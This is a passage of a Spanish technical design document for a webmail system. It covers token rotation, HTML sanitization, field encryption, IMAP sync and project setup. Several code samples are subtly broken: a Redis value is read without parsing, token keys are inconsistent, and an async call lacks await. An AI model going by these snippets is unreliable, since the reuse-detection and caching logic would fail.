await redis.setex(`refresh:${userId}:${tokenId}`, 604800, JSON.stringify({
  familyId,           // Identificador de familia de tokens
  issuedAt: Date.now(),
  userAgent: req.headers['user-agent'],
  ipAddress: req.ip
}));
```

La cookie que transporta el refresh token al navegador tiene los siguientes atributos de seguridad: `HttpOnly` (inaccesible para `document.cookie` en JavaScript), `Secure` (solo se transmite por HTTPS), `SameSite=Strict` (no se envía en peticiones cross-origin), `Path=/auth/refresh` (scope limitado al endpoint de refresh).

#### 9.2.3 Rotación con token families, detección de reúso

La rotación de refresh tokens es obligatoria: cada vez que un refresh token se utiliza para obtener un nuevo access token, se genera un nuevo refresh token y el anterior se marca como consumido. Esto limita la ventana de oportunidad para un atacante que robe un refresh token [^157^].

El sistema de familias de tokens agrupa todos los refresh tokens emitidos a partir de un mismo login inicial bajo un `familyId` compartido. Si un refresh token ya consumido se utiliza nuevamente (indicando un posible robo), toda la familia se revoca inmediatamente y el usuario debe re-autenticarse:

```javascript
async function rotateRefreshToken(oldTokenId, familyId) {
  const oldToken = await redis.get(`refresh:${oldTokenId}`);
  if (!oldToken || oldToken.status === 'revoked') {
    // Posible reúso detectado: revocar toda la familia
    await revokeFamily(familyId);
    throw new SecurityError('Token reuse detected. Full re-authentication required.');
  }
  // Marcar como consumido, emitir nuevo token
  await redis.setex(`refresh:${oldTokenId}`, 604800, JSON.stringify({ ...oldToken, status: 'consumed' }));
  const newTokenId = crypto.randomBytes(16).toString('hex');
  await redis.setex(`refresh:${newTokenId}`, 604800, JSON.stringify({ familyId, status: 'active' }));
  return newTokenId;
}
```

### 9.3 HTML Sanitization Pipeline

El pipeline de sanitización de HTML es la pieza crítica que diferencia a Webmail 6.0 de clientes vulnerables como Roundcube. Opera como una cadena de procesamiento secuencial donde cada etapa recibe la salida de la anterior.

#### 9.3.1 DOMPurify con jsdom (no happy-dom)

La elección de `jsdom` sobre `happy-dom` como entorno DOM subyacente no es arbitraria. DOMPurify depende del parser HTML del navegador para construir el árbol DOM que luego recorre y limpia. `jsdom` utiliza el parser HTML5 de estándar de la WHATWG, mientras que `happy-dom` implementa su propio parser con optimizaciones de rendimiento que pueden diferir sutilmente en el manejo de HTML malformado o técnicas de obfuscación [^53^]. En seguridad, la conformidad estricta con el estándar es prioritaria sobre la velocidad.

El pipeline completo para un correo HTML entrante:

```javascript
async function sanitizeEmailHtml(rawHtml) {
  // Paso 1: Inlinear CSS externo con Juice
  const inlined = juice(rawHtml, { webResources: { images: false } });

  // Paso 2: Sanitizar con DOMPurify sobre jsdom
  const sanitized = DOMPurify.sanitize(inlined, EMAIL_CONFIG);

  // Paso 3: Filtrar propiedades CSS peligrosas del style inline
  const filtered = filterCssProperties(sanitized, ALLOWED_CSS_PROPS);

  // Paso 4: Inyectar nonce CSP y envolver en sandboxed iframe
  return wrapInSandbox(filtered, generateNonce());
}
```

#### 9.3.2 Configuración allowedTags/allowedAttributes

La lista blanca de elementos HTML permitidos se basa en el subconjunto seguro identificado por OWASP y Cure53. Elementos activos como `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`, `<style>` se eliminan por completo. De los atributos permitidos, se excluyen todos los event handlers inline (`onclick`, `onerror`, `onload`, `onmouseover`, etc.) y atributos de datos (`data-*`) que podrían usarse para almacenar payloads.

Para enlaces (`<a>`), el atributo `target` se fuerza a `_blank` con `rel="noopener noreferrer"` para prevenir tabnabbing. Las URLs de `href` se validan contra una expresión regular que solo permite esquemas `http://`, `https://`, `mailto:`, `tel:` y `cid:` (para imágenes inline de correo).

#### 9.3.3 CSP nonces + Trusted Types

En navegadores que soportan Trusted Types (Chromium 83+, Firefox en desarrollo), Webmail 6.0 activa la política adicional `require-trusted-types-for 'script'`, que obliga a que todo HTML insertado en el DOM pase por un policy de Trusted Types validado. Esto elimina clases enteras de ataques DOM XSS donde un atacante inyecta HTML a través de métodos como `innerHTML` o `document.write` [^89^].

```javascript
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  window.trustedTypes.createPolicy('email-sanitizer', {
    createHTML: (input) => DOMPurify.sanitize(input, EMAIL_CONFIG)
  });
}
```

### 9.4 Encriptación de Datos Sensibles

#### 9.4.1 mongoose-aes-encryption plugin

El plugin `mongoose-aes-encryption` proporciona cifrado transparente a nivel de campo para schemas Mongoose [^154^]. La aplicación lee y escribe valores en texto plano mientras únicamente ciphertext (texto cifrado) persiste en MongoDB. Esto protege las credenciales IMAP incluso si la base de datos se ve comprometida mediante un dump o acceso no autorizado.

El plugin se aplica al schema designando qué campos deben cifrarse:

```javascript
import createAESPlugin from 'mongoose-aes-encryption';

const plugin = createAESPlugin({
  key: process.env.ENCRYPTION_KEY // Buffer de 32 bytes
});

schema.plugin(plugin, {
  fields: ['imapPassword', 'oauth2AccessToken', 'oauth2RefreshToken'],
  sensitive: true  // Excluir de logs y JSON.stringify por defecto
});
```

#### 9.4.2 AES-256-GCM: key 32 bytes, IV 12-16 bytes único

AES-256-GCM (Galois/Counter Mode) es el modo de operación recomendado porque proporciona cifrado autenticado (AEAD): además de ocultar el contenido, detecta cualquier modificación del ciphertext. Los parámetros son no negociables:

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| Algoritmo | AES-256-GCM | Cifrado autenticado con tag de 128 bits |
| Key | 32 bytes (256 bits) | Generada con `crypto.randomBytes(32)` |
| IV | 12 bytes (96 bits) | Único por operación; nunca reutilizado con la misma key |
| Auth Tag | 16 bytes (128 bits) | Generado automáticamente por GCM; verificado en decrypt |
| Key Derivation | HKDF-SHA256 | Para derivar keys de contextos diferentes |

La reutilización de un IV con la misma clave en AES-GCM es catastrófica: un atacante con dos ciphertexts cifrados con el mismo IV puede recuperar el XOR de los plaintexts originales, y potencialmente forjar mensajes autenticados. Por ello, Webmail 6.0 genera un IV criptográficamente aleatorio de 12 bytes para cada operación de cifrado usando `crypto.randomBytes(12)` [^108^][^119^].

#### 9.4.3 Key management: env dev, KMS producción

La gestión de claves de cifrado sigue el principio de separación de secretos:

- **Desarrollo local:** La clave maestra se almacena en variable de entorno `ENCRYPTION_KEY` como hex string de 64 caracteres (32 bytes). El archivo `.env` se incluye en `.gitignore` con reglas estrictas.

- **Producción:** La clave maestra se almacena en un Key Management Service (KMS) como AWS Secrets Manager, HashiCorp Vault o Azure Key Vault. El backend obtiene la clave en tiempo de arranque y la mantiene en memoria. Nunca se persiste en disco ni en logs.

- **Rotación de claves:** Cuando se rota la clave maestra, los registros existentes se descifran con la clave anterior y se recifran con la nueva. Este proceso opera como un job de fondo de baja prioridad en BullMQ para no impactar el servicio en producción.

- **Clave de encriptación de datos (DEK) vs clave de encriptación de claves (KEK):** En configuraciones enterprise, se implementa envelope encryption: cada cuenta de usuario tiene su propia DEK generada aleatoriamente, y esta DEK se cifra con la KEK maestra almacenada en el KMS. Esto permite la rotación de la KEK sin recifrar todos los datos de usuario [^119^].


---

## 10. Sincronización IMAP ↔ MongoDB

La eficiencia del motor de sincronización determina si un webmail se siente instantáneo o torpe. Gmail carga la bandeja de entrada en menos de un segundo para mailboxes de decenas de miles de mensajes porque nunca fetchea cuerpos completos en la carga inicial. Webmail 6.0 replica esta estrategia con un enfoque de tres capas: headers primero, cuerpo bajo demanda, y cache efímero para reducir latencia perceptible.

### 10.1 Estrategia: Headers Primero, Body Bajo Demanda

El principio fundamental de la sincronización en Webmail 6.0 es la separación estricta entre metadata (headers, flags, tamaño) y contenido (cuerpo, adjuntos). Los headers constituyen aproximadamente el 0.5% del tamaño total de un correo promedio; fetchear solo headers permite construir una lista de mensajes completa órdenes de magnitud más rápido que descargar cada correo en su totalidad [^70^][^75^].

#### 10.1.1 BODY.PEEK[HEADER.FIELDS] — rápido, no marca \Seen

El comando IMAP `BODY.PEEK[HEADER.FIELDS (...)]` es la herramienta principal de la sincronización inicial. La variante `PEEK` es crítica porque no marca implícitamente el mensaje como leído (`\Seen`) al fetchearlo, comportamiento que el flag `BODY[]` sí activaría [^70^][^78^]. Un webmail que fetchea headers para mostrar una lista no debe alterar el estado de lectura de los correos.

Los campos de header que Webmail 6.0 extrae son:

```
BODY.PEEK[HEADER.FIELDS (DATE SUBJECT FROM TO CC BCC REPLY-TO IN-REPLY-TO REFERENCES MESSAGE-ID CONTENT-TYPE X-PRIORITY X-MSMAIL-PRIORITY)]
```

Estos campos permiten: identificación única (Message-ID), threading (References, In-Reply-To), presentación de lista (From, Subject, Date), clasificación de prioridad, y detección de tipo de contenido. El campo `REFERENCES` es esencial para el algoritmo JWZ de threading, que opera construyendo un grafo de parent-child entre mensajes y luego ordenando conversaciones por fecha [^56^].

Outlook (cliente desktop) utiliza un patrón similar: fetchea `BODY.PEEK[HEADER]`, `FLAGS`, `RFC822.SIZE` e `INTERNALDATE` como metadata para construir su lista local antes de descargar cuerpos bajo demanda [^72^].

#### 10.1.2 Body solo al abrir → Redis cache 1 hora

Cuando el usuario abre un correo específico, el backend ejecuta un `BODY.PEEK[]` para obtener el cuerpo completo. Este proceso sigue el flujo: (1) verificar Redis cache por Message-ID; (2) en cache hit, retornar directamente; (3) en cache miss, fetchear vía IMAP, parsear con PostalMime, sanitizar HTML con DOMPurify, y almacenar en Redis con TTL de 1 hora.

```javascript
const bodyKey = `email:body:${messageId}`;
let body = await redis.get(bodyKey);
if (!body) {
  const fullMessage = await imapClient.fetchOne(uid, { source: true });
  const parsed = await PostalMime.parse(fullMessage.source);
  const sanitizedHtml = sanitizeEmailHtml(parsed.html || parsed.textAsHtml || '');
  body = { html: sanitizedHtml, text: parsed.text, attachments: parsed.attachments };
  await redis.setex(bodyKey, 3600, JSON.stringify(body)); // TTL 1 hora
}
```

El TTL de 1 hora equilibra hit ratio (probabilidad de que el usuario reabra el correo poco después) con frescura de datos (si el correo se modifica en el servidor IMAP, el cache expira antes de que la inconsistencia sea problemática).

#### 10.1.3 Preview texto: 500 chars para búsqueda

Para cada correo sincronizado, el backend extrae los primeros 500 caracteres del contenido texto plano y los almacena en MongoDB en el campo `textPreview`. Este campo cumple dos funciones: proporciona una vista previa visible en la lista de correos sin necesidad de cargar el cuerpo completo, y actúa como target para búsquedas full-text cuando MongoDB Atlas Search no está disponible.

La extracción de preview opera sobre el texto plano resultante del parsing MIME, no sobre el HTML sanitizado, para evitar que etiquetas residualmente visibles (`<div>`, `style=...`) contaminen el texto de búsqueda.

### 10.2 Sincronización Inicial

La primera vez que un usuario vincula una cuenta IMAP, Webmail 6.0 ejecuta una sincronización completa que descarga los headers de todas las carpetas. Para una mailbox con 50.000 correos distribuidos en 15 carpetas, este proceso típicamente toma entre 30 y 120 segundos dependiendo de la latencia al servidor IMAP.

#### 10.2.1 FETCH headers todas carpetas → MongoDB batching

El proceso de sincronización inicial opera carpeta por carpeta en secuencia paralela controlada:

```javascript
async function initialSync(imapClient, accountId) {
  const lock = await imapClient.getMailboxLock('INBOX');
  try {
    const batchSize = 100; // UIDs por batch
    const uids = await imapClient.search({ all: true });

    for (let i = 0; i < uids.length; i += batchSize) {
      const batch = uids.slice(i, i + batchSize);
      const fetchResult = await imapClient.fetch(batch, {
        uid: true,
        flags: true,
        internalDate: true,
        size: true,
        envelope: true,
        headers: ['references', 'in-reply-to', 'message-id', 'x-gm-thrid']
      });

      const docs = [];
      for await (const msg of fetchResult) {
        docs.push({
          accountId,
          uid: msg.uid,
          messageId: msg.envelope.messageId,
          subject: msg.envelope.subject,
          from: msg.envelope.from,
          to: msg.envelope.to,
          date: msg.internalDate,
          flags: msg.flags,
          size: msg.size,
          references: msg.headers?.get('references')?.split(/\s+/) || [],
          inReplyTo: msg.headers?.get('in-reply-to'),
          gmailThreadId: msg.headers?.get('x-gm-thrid'),
          mailbox: 'INBOX',
          syncedAt: new Date()
        });
      }
      // Insert batch en MongoDB
      await EmailHeader.insertMany(docs, { ordered: false });
    }
  } finally {
    lock.release();
  }
}
```

El parámetro `ordered: false` en `insertMany` permite que un batch continúe insertando incluso si documentos individuales fallan (por ejemplo, por duplicación de `messageId` único), maximizando el throughput de escritura.

#### 10.2.2 Progreso vía WebSocket

Durante la sincronización inicial, el backend publica eventos de progreso a través de Redis Pub/Sub, que los servidores WebSocket retransmiten al cliente:

```javascript
// Backend publica progreso
await redis.publish(`sync:${accountId}`, JSON.stringify({
  type: 'PROGRESS',
  mailbox: 'INBOX',
  processed: 1500,
  total: 50000,
  percent: 3
}));
```

El frontend muestra una barra de progreso con el porcentaje completado y la carpeta actual. Si el usuario cierra el navegador, la sincronización continúa en el backend y reanuda la transmisión de progreso cuando el cliente se reconecta.

El siguiente diagrama ilustra el flujo completo de sincronización, desde la conexión IMAP hasta la disponibilidad de datos para el usuario:

```mermaid
flowchart TD
    A["Usuario vincula cuenta IMAP"] --> B["Backend: abre conexión imapflow"]
    B --> C{"Servidor soporta QRESYNC?"}
    C -->|Sí| D["Sincronización incremental CONDSTORE"]
    C -->|No| E["Sincronización completa headers"]
    E --> F["BODY.PEEK[HEADER.FIELDS] por batch"]
    F --> G["Parsear con PostalMime"]
    G --> H["Extraer textPreview 500 chars"]
    H --> I["Batch insert en MongoDB"]
    I --> J["Publicar progreso vía Redis Pub/Sub"]
    J --> K["WebSocket → frontend barra de progreso"]
    D --> L["FETCH solo UIDs nuevos + flags cambiados"]
    L --> I
    I --> M["IMAP IDLE activo para push <1s"]
    M --> N{"Nuevo mensaje?"}
    N -->|Sí| O["FETCH header nuevo → MongoDB insert"]
    N -->|No| P{"Timeout 29 min?"}
    P -->|Sí| Q["Reactivar IDLE"]
    P -->|No| M
    O --> R["Redis Pub/Sub → WebSocket → notificación UI"]

    style A fill:#e1f5e1,stroke:#333,stroke-width:2px
    style M fill:#e1f5fe,stroke:#333,stroke-width:2px
    style R fill:#fff3e0,stroke:#333,stroke-width:2px
    style E fill:#ffebee,stroke:#333,stroke-width:2px
    style D fill:#e8f5e9,stroke:#333,stroke-width:2px
```

### 10.3 Sincronización Incremental

Una vez completada la sincronización inicial, Webmail 6.0 transiciona a un modo incremental que solo procesa cambios: correos nuevos, flags modificados (leído/destacado/basura) y mensajes eliminados. Este modo es crítico para la eficiencia a largo plazo: en un mailbox con 50.000 correos donde llegan 50 nuevos correos por día, la sincronización incremental procesa solo esos 50 correos en lugar de re-escanear todo el mailbox.

| Estrategia | Latencia | Complejidad | Compatibilidad servidor | Uso en Webmail 6.0 |
|------------|----------|-------------|------------------------|-------------------|
| IMAP IDLE (push) | < 1 segundo | Baja | ~85% servidores modernos [^63^] | Primario: notificación inmediata de nuevos correos |
| Polling 30-60s | 30-60 segundos | Mínima | Universal | Fallback: servidores sin IDLE o conexiones inestables |
| CONDSTORE/QRESYNC | < 5 segundos | Alta | Gmail, Cyrus, Dovecot 2.x | Optimización: sincronización delta de flags y UIDs |
| UID FETCH secuencial | Proporcional a mailbox | Media | Universal | Fallback legacy: servidores sin extensiones modernas |

#### 10.3.1 IMAP IDLE (push) → notificaciones <1s

IMAP IDLE (RFC 2177) mantiene una conexión TCP persistente abierta donde el servidor IMAP "empuja" una notificación al cliente inmediatamente cuando llega un nuevo mensaje, en lugar de requerir que el cliente pregunte periódicamente [^62^][^63^]. `imapflow` gestiona IDLE automáticamente: abre la conexión IDLE en la carpeta seleccionada y reinicia el comando periódicamente antes del timeout del servidor mediante el parámetro `maxIdleTime` (configurado a 29 minutos, justo bajo el límite típico de 30 minutos de la mayoría de servidores) [^39^][^41^].

```javascript
imapClient.on('exists', async (data) => {
  // Nuevo mensaje detectado en la carpeta monitoreada
  const newUid = data.uid;
  const message = await imapClient.fetchOne(newUid, {
    uid: true, flags: true, internalDate: true, envelope: true
  });
  await storeHeaderInMongo(message);
  await redis.publish(`notify:${accountId}`, JSON.stringify({
    type: 'NEW_EMAIL', uid: newUid, subject: message.envelope.subject
  }));
});
```

La limitación principal de IDLE es que la mayoría de servidores IMAP solo permiten IDLE en una carpeta a la vez. Webmail 6.0 prioriza la bandeja INBOX para IDLE y utiliza polling corto (30 segundos) para las demás carpetas.

#### 10.3.2 Polling 30-60s fallback

Para servidores que no soportan IDLE (raros en 2026 pero aún presentes en entornos corporativos heredados) o cuando la conexión IDLE se interrumpe por timeouts de red intermedios, Webmail 6.0 recurre a polling con intervalo adaptativo:

- INBOX: 30 segundos (máxima prioridad)
- Drafts, Sent: 60 segundos
- Carpetas de archivo/etiquetas: 300 segundos (5 minutos)

El intervalo se ajusta dinámicamente: si un polling no detecta cambios en 3 ciclos consecutivos, el intervalo se duplica hasta un máximo de 5 minutos. Si se detectan cambios, el intervalo vuelve al valor base.

#### 10.3.3 CONDSTORE/QRESYNC — solo UIDs nuevos y flags cambiados

Para servidores que soportan extensiones modernas, Webmail 6.0 utiliza CONDSTORE (RFC 7162) y QRESYNC para sincronizaciones aún más eficientes [^39^].

**CONDSTORE** asocia un número de modificación (`MODSEQ`) con cada mensaje. El cliente almacena el `HIGHESTMODSEQ` conocido y en la siguiente sincronización solicita solo mensajes con `MODSEQ` mayor:

```
A001 FETCH 1:* (FLAGS) (CHANGEDSINCE 123456789)
```

Esto devuelve únicamente los mensajes cuyos flags han cambiado desde la última sincronización, típicamente una fracción minúscula del mailbox total.

**QRESYNC** extiende CONDSTORE para reconexiones eficientes. El cliente proporciona su `UIDVALIDITY`, `UIDNEXT` y `HIGHESTMODSEQ` conocidos, y el servidor responde con: lista de UIDs que han desaparecido (eliminados/expurgados), lista de UIDs nuevos, y lista de mensajes con flags modificados [^39^].

`imapflow` habilita estas extensiones automáticamente cuando el servidor las anuncia en su capacidad. La configuración de Webmail 6.0 establece `qresync: true` en las opciones del cliente:

```javascript
const client = new ImapFlow({
  host: 'imap.gmail.com',
  port: 993,
  secure: true,
  auth: { user: email, accessToken: oauthToken },
  qresync: true,           // Habilitar QRESYNC si disponible
  maxIdleTime: 29 * 60000, // 29 minutos, reiniciar IDLE antes del timeout
  emitLogs: false
});
```

### 10.4 Connection Pooling

Las conexiones IMAP son relativamente costosas de establecer (handshake TLS, login, selección de carpeta). Crear una nueva conexión para cada operación degradaría severamente el rendimiento y rápidamente agotaría los límites de conexiones permitidos por los proveedores.

#### 10.4.1 Singleton pattern, timeout 5min, backoff exponencial

Webmail 6.0 implementa un gestor de conexiones IMAP basado en el patrón Singleton que reutiliza conexiones dentro de una ventana de tiempo y aplica backoff exponencial ante fallos de conexión [^137^]:

```javascript
class ImapConnectionPool {
  private static pools = new Map<string, ImapClient>();
  private static lastUsed = new Map<string, number>();
  private static readonly IDLE_TIMEOUT = 5 * 60 * 1000; // 5 minutos

  static async getConnection(accountId: string, credentials: Credentials): Promise<ImapClient> {
    const existing = this.pools.get(accountId);
    const lastUse = this.lastUsed.get(accountId) || 0;

    if (existing && !existing.closed && (Date.now() - lastUse) < this.IDLE_TIMEOUT) {
      this.lastUsed.set(accountId, Date.now());
      return existing;
    }

    // Crear nueva conexión
    const client = new ImapFlow({ ...credentials, logger: false });
    await client.connect();
    this.pools.set(accountId, client);
    this.lastUsed.set(accountId, Date.now());

    client.on('close', () => this.pools.delete(accountId));
    return client;
  }

  static async release(accountId: string): Promise<void> {
    const client = this.pools.get(accountId);
    if (client && !client.closed) {
      await client.logout();
      this.pools.delete(accountId);
    }
  }
}
```

El timeout de 5 minutos de inactividad equilibra reutilización de conexiones con liberación temprana de recursos del servidor IMAP. El backoff exponencial se aplica ante errores de conexión: 1 segundo tras el primer fallo, 2 segundos tras el segundo, 4, 8, 16, hasta un máximo de 60 segundos entre reintentos.

#### 10.4.2 Límites: Gmail 250, Outlook 20

Cada proveedor de email impone límites estrictos de conexiones IMAP simultáneas por cuenta [^137^]:

| Proveedor | Límite conexiones IMAP | Notas |
|-----------|----------------------|-------|
| Gmail | 250 conexiones simultáneas | Alto límite; OAuth2 obligatorio desde marzo 2025 [^58^] |
| Outlook/Exchange Online | 20 conexiones simultáneas | Restricción agresiva; planificar cuidadosamente pooling [^59^] |
| Fastmail | 50 conexiones simultáneas | Soporte completo de CONDSTORE/QRESYNC |
| Dovecot (self-hosted) | Configurable | Típicamente 100+ por defecto |

Webmail 6.0 respeta estos límites manteniendo un máximo de 1 conexión activa por cuenta de usuario, compartida entre todas las operaciones (sync, IDLE, búsqueda). Para operaciones que requieren acceso simultáneo a múltiples carpetas (mover correos entre carpetas, búsqueda cross-folder), las operaciones se serializan sobre la misma conexión mediante el sistema de mailbox locking de `imapflow` [^1^].

#### 10.4.3 Mailbox locking imapflow

`imapflow` implementa locking de mailbox a través del método `getMailboxLock()`, que garantiza acceso exclusivo a una carpeta durante la ejecución de un bloque de código. Este mecanismo es esencial para prevenir condiciones de carrera cuando múltiples operaciones concurrentes intentan interactuar con la misma carpeta [^1^]:

```javascript
const lock = await client.getMailboxLock('INBOX');
try {
  // Solo este bloque puede interactuar con INBOX
  await client.messageFlagsAdd(uid, ['\\Seen']);
  await client.messageMove(uid, 'Archive');
} finally {
  lock.release(); // Siempre liberar, incluso ante excepción
}
```

El patrón `try/finally` asegura que el lock se libera incluso si una excepción interrumpe la operación, previniendo deadlocks que dejarían la conexión inutilizable.

### 10.5 Búsqueda

La búsqueda de correos es una operación de alto impacto en la experiencia de usuario. Webmail 6.0 implementa una estrategia de tres niveles que prioriza velocidad local y recurre al servidor IMAP solo cuando es necesario.

#### 10.5.1 MongoDB compound indexes en subject/from/to/textPreview

Para búsquedas exactas y prefijos, MongoDB compound indexes proporcionan respuestas en milisegundos sobre datasets de cientos de miles de correos. La regla ESR (Equality → Sort → Range) guía el diseño de índices [^204^]:

```javascript
// Índice principal para queries de bandeja ordenadas por fecha
db.emailHeaders.createIndex({ accountId: 1, mailbox: 1, date: -1, uid: 1 });

// Índice para búsqueda por remitente
db.emailHeaders.createIndex({ accountId: 1, "from.address": 1, date: -1 });

// Índice para búsqueda por asunto (case-insensitive con collation)
db.emailHeaders.createIndex(
  { accountId: 1, subject: 1 },
  { collation: { locale: 'en', strength: 2 } } // strength 2 = case-insensitive
);

// Índice de texto sobre preview para búsqueda básica full-text
db.emailHeaders.createIndex(
  { accountId: 1, subject: "text", textPreview: "text", "from.name": "text" },
  { weights: { subject: 10, textPreview: 5, "from.name": 3 }, name: "email_search_text" }
);
```

El índice `accountId` como prefijo de todos los índices compuestos es esencial para la segmentación de datos por usuario. Sin este prefijo, un índice escanearía correos de todas las cuentas, degradando gravemente el rendimiento en instancias multi-usuario.

#### 10.5.2 Atlas Search para full-text avanzado

MongoDB Atlas Search, basado en Apache Lucene, proporciona capacidades de búsqueda full-text integradas sin infraestructura adicional [^132^]. Cuando Atlas Search está disponible, las búsquedas se ejecutan mediante el stage `$search` del aggregation pipeline:

```javascript
db.emailHeaders.aggregate([
  { $search: {
      index: 'email_search',
      compound: {
        must: [
          { text: { query: accountId, path: 'accountId' } },
          { text: { query: searchTerm, path: ['subject', 'textPreview', 'from.name'], fuzzy: { maxEdits: 1 } } }
        ]
      }
  }},
  { $sort: { date: -1 } },
  { $limit: 50 }
]);
```

Las capacidades que Atlas Search añaden sobre índices MongoDB nativos incluyen: búsqueda fuzzy (tolerancia a errores tipográficos), highlighting de términos coincidentes, autocompletado (typeahead), sinónimos, y scoring de relevancia con boosting de campos. Atlas Search cubre aproximadamente el 90% de los casos de uso de búsqueda en email [^132^].

#### 10.5.3 Fallback IMAP SEARCH

Cuando MongoDB no contiene el correo buscado (por ejemplo, si el usuario deshabilitó la sincronización para una carpeta de archivo) o cuando la instancia no utiliza MongoDB Atlas, Webmail 6.0 recurre al comando IMAP `SEARCH`. Este comando busca directamente en el servidor IMAP, con la latencia adicional de la comunicación de red pero sin dependencia de datos locales:

```javascript
// Fallback: búsqueda IMAP server-side
const results = await imapClient.search({
  header: ['subject', searchTerm]
});
// results contiene UIDs coincidentes; fetchear headers bajo demanda
```

La búsqueda IMAP soporta criterios como `FROM`, `TO`, `SUBJECT`, `BODY`, `SINCE`, `BEFORE`, `LARGER`, `SMALLER`, y combinaciones booleanas. Sin embargo, no soporta búsqueda fuzzy ni ranking de relevancia, por lo que su UX es inferior a la búsqueda local. Webmail 6.0 utiliza IMAP SEARCH como último recurso, mostrando al usuario una indicación de que la búsqueda puede ser lenta.

La combinación de índices MongoDB locales, Atlas Search cuando está disponible, y IMAP SEARCH como fallback garantiza que el usuario siempre pueda encontrar correos independientemente de la configuración de sincronización o el estado de conectividad, manteniendo la latencia por debajo de 200 ms para el 95% de las búsquedas sobre datos sincronizados.


---

# 11. Guía de Implementación Paso a Paso

Este capítulo presenta una guía de implementación específica y ejecutable para construir Webmail 6.0 en siete semanas. Cada fase incluye comandos exactos, archivos de configuración y criterios de validación. La estructura sigue un monorepo con workspaces de pnpm, Docker Compose para infraestructura y TypeScript strict en todo el stack.

## 11.1 Fase 1: Setup Inicial (Semana 1)

**Objetivos:** Establecer la estructura del monorepo, configurar Docker Compose con todos los servicios de infraestructura y aplicar estandarización de código.

**Entregables:** Repositorio inicializado, contenedores levantados, linting configurado.

### 11.1.1 Monorepo con pnpm Workspaces

El monorepo se organiza en tres packages principales: `packages/web` (Vue 3 frontend), `packages/api` (Fastify backend) y `packages/shared` (tipos y utilidades compartidos).

```bash
# Crear estructura del proyecto
mkdir webmail6 && cd webmail6
git init
corepack enable
corepack prepare pnpm@9.15.0 --activate

# Inicializar workspaces
cat > pnpm-workspace.yaml << 'EOF'
packages:
  - 'packages/*'
EOF

# Package root con scripts globales
cat > package.json << 'EOF'
{
  "name": "webmail6",
  "version": "0.1.0",
  "private": true,
  "packageManager": "pnpm@9.15.0",
  "scripts": {
    "dev": "pnpm -r --parallel dev",
    "build": "pnpm -r build",
    "lint": "pnpm -r lint",
    "test": "pnpm -r test",
    "test:unit": "pnpm -r --parallel test:unit",
    "test:e2e": "pnpm -r test:e2e",
    "typecheck": "pnpm -r typecheck"
  },
  "devDependencies": {
    "@types/node": "^22.10.0",
    "typescript": "^5.7.0",
    "eslint": "^9.17.0",
    "@eslint/js": "^9.17.0",
    "prettier": "^3.4.0",
    "globals": "^15.14.0"
  }
}
EOF

# Crear directorios
mkdir -p packages/shared/src packages/api/src packages/web/src

# Package shared (tipos, schemas, utilidades)
cat > packages/shared/package.json << 'EOF'
{
  "name": "@webmail6/shared",
  "version": "0.1.0",
  "type": "module",
  "main": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "exports": {
    ".": { "import": "./dist/index.js", "types": "./dist/index.d.ts" }
  },
  "scripts": {
    "build": "tsc",
    "dev": "tsc --watch",
    "typecheck": "tsc --noEmit"
  },
  "devDependencies": { "typescript": "^5.7.0" }
}
EOF

# tsconfig base para todo el monorepo
cat > tsconfig.base.json << 'EOF'
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true
  }
}
EOF
```

**Criterio de validación:** Ejecutar `pnpm install` sin errores y verificar que `pnpm -r typecheck` funciona en los packages con TypeScript inicializado.

### 11.1.2 Docker Compose Base

El stack de infraestructura incluye MongoDB 7 para persistencia, Redis 7 para sesiones y caché, SeaweedFS para almacenamiento de adjuntos y Nginx como reverse proxy.

```yaml
# docker-compose.yml
services:
  mongo:
    image: mongo:7.0.16
    container_name: webmail6_mongo
    restart: unless-stopped
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD_FILE: /run/secrets/mongo_root_password
    secrets:
      - mongo_root_password
    volumes:
      - mongo_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro
    ports:
      - "27017:27017"
    healthcheck:
      test: ["CMD", "mongosh", "--eval", "db.adminCommand('ping')"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s
    networks:
      - webmail6_net
    deploy:
      resources:
        limits: { memory: 2G }
        reservations: { memory: 512M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

  redis:
    image: redis:7.4-alpine
    container_name: webmail6_redis
    restart: unless-stopped
    command: redis-server --appendonly yes --maxmemory 256mb --maxmemory-policy allkeys-lru
    volumes:
      - redis_data:/data
    ports:
      - "6379:6379"
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 3s
      retries: 5
    networks:
      - webmail6_net
    deploy:
      resources:
        limits: { memory: 512M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

  seaweedfs:
    image: chrislusge/seaweedfs:3.80
    container_name: webmail6_seaweed
    restart: unless-stopped
    command: "server -s3 -dir=/data -volume.max=50"
    volumes:
      - seaweed_data:/data
    ports:
      - "8333:8333"
      - "9333:9333"
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:9333"]
      interval: 15s
      timeout: 5s
      retries: 5
    networks:
      - webmail6_net
    deploy:
      resources:
        limits: { memory: 1G }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

  nginx:
    image: nginx:1.27-alpine
    container_name: webmail6_nginx
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/conf.d:/etc/nginx/conf.d:ro
      - certbot_data:/etc/letsencrypt
    depends_on:
      api:
        condition: service_healthy
    networks:
      - webmail6_net
    deploy:
      resources:
        limits: { memory: 128M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

  api:
    build:
      context: .
      dockerfile: packages/api/Dockerfile
      target: production
    container_name: webmail6_api
    restart: unless-stopped
    environment:
      NODE_ENV: production
      PORT: 3000
      MONGODB_URI: mongodb://admin:${MONGO_PASSWORD}@mongo:27017/webmail6?authSource=admin
      REDIS_URL: redis://redis:6379
